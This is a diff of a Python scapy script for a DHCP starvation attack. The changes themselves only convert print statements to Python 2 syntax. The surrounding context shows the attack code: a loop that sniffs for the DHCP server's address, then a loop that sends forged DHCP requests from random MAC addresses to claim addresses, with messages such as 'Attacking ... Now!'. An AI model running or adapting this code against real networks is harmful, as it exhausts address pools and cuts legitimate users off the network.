@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+#!/usr/bin/env python
 
 from scapy.all import *
 from time import ctime,sleep
@@ -11,7 +11,7 @@ current_subnet = '0.0.0.0'
 
 def getdhcpip():
     global flag
-    print("[+] Geting The DHCP server IP Address!")
+    print "[+] Geting The DHCP server IP Address!"
     while flag == 0:
         tap_interface = 'eth0'
         src_mac_address = RandMAC()
@@ -36,8 +36,8 @@ def matchpacket():
             dhcp_address = a[1][1][0].src
             if dhcp_address is not '0.0.0.0' and current_subnet is not '0.0.0.0':
                 flag = 1
-                print("[+] The DHCP SERVER IP ADDRESS IS "+dhcp_address + "\r\n")
-                print("[+] CURRENT NETMASK IS " + current_subnet+"\r\n")
+                print "[+] The DHCP SERVER IP ADDRESS IS "+dhcp_address + "\r\n"
+                print "[+] CURRENT NETMASK IS " + current_subnet+"\r\n"
 
         except:
             pass
@@ -68,7 +68,7 @@ def dhcp_attack():
         rand_mac_address = RandMAC()
         dhcp_attack_packet = Ether(src=rand_mac_address,dst='ff:ff:ff:ff:ff:ff')/IP(src='0.0.0.0',dst='255.255.255.255')/UDP(sport=68,dport=67)/BOOTP(chaddr=rand_mac_address)/DHCP(options=[("message-type",'request'),("server_id",dhcp_address),("requested_addr",need_address),"end"])
         sendp(dhcp_attack_packet,verbose=0)
-        print("[+] USE IP: "+need_address +" Attacking "+dhcp_address +" Now!")
+        print "[+] USE IP: "+need_address +" Attacking "+dhcp_address +" Now!"
 		
 def main():
     threads= []
@@ -84,4 +84,4 @@ def main():
     
 if __name__ == '__main__':
     main()
-    print("[+] Attack Over!")
+    print "[+] Attack Over!"
